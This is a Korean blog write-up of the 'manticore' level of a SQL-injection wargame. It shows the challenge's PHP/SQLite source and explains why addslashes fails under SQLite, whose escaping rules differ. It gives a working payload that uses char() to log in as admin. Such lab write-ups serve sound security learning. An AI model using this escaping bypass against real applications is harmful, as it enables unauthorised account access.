---
title : "LOS Lv.38 manticore (풀이 봄)"
categories : [Wargame, rubiya]
tags : [풀이 봄]
---

## manticore
<hr style="border-top: 1px solid;"><br>

```php
query : select id from member where id='' and pw=''

<?php
  include "./config.php";
  login_chk();
  $db = sqlite_open("./db/manticore.db");
  $_GET['id'] = addslashes($_GET['id']);
  $_GET['pw'] = addslashes($_GET['pw']);
  $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = sqlite_fetch_array(sqlite_query($db,$query));
  if($result['id'] == "admin") solve("manticore");
  highlight_file(__FILE__);
?>
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

```%a1~%fe```가 안된다.. 흠..

풀이 봄..
: <a href="https://blog.limelee.xyz/entry/LOS-manticore?category=711778" target="_blank">blog.limelee.xyz/entry/LOS-manticore?category=711778</a>

<br>

sqlite는 ```\```을 통해 escape string을 처리하지 않음.
: ```id='\\'``` 이렇게 하면 db에는 id 값에 그냥 ```\\```이 들어감!
: **sqlite에서는 single quote를 두 개를 써서 escape 처리함.**

<br>

SQLite String Escape 처리
: <a href="http://www.devkuma.com/books/pages/1273" target="_blank">devkuma.com/books/pages/1273</a>

<br>

따라서 그냥 ```id='\''``` 이렇게 된다면 escape 처리가 되지 않는다는 것이므로 그냥 ```?id=' or id=0x61646D696E --%20```이라고 하면?
: ```id='\' or id=0x61646D696E -- '``` -> 실패함

<br>

이유는 **"hexadecimal integer literals are not considered well-formed and are stored as TEXT."**
: 16진수 정수 리터럴은 올바른 형식으로 구성되지 않은 것으로 간주되어 TEXT로 저장됨.

<br>

따라서 hex 값을 넣어도 mysql처럼 바뀌지 않고 TEXT로 들어가서 검색이 안된 것임.

single quote를 못쓰므로 char 함수를 이용해서 값을 넣으면 됨. 

<br>

sqlite online 
: <a href="https://sqliteonline.com/" target="_blank">sqliteonline.com/</a>

<br>

Payload
: ```?id=' or id=char(97,100,109,105,110) --%20```

<br><br>
<hr style="border: 2px solid;">
<br><br>
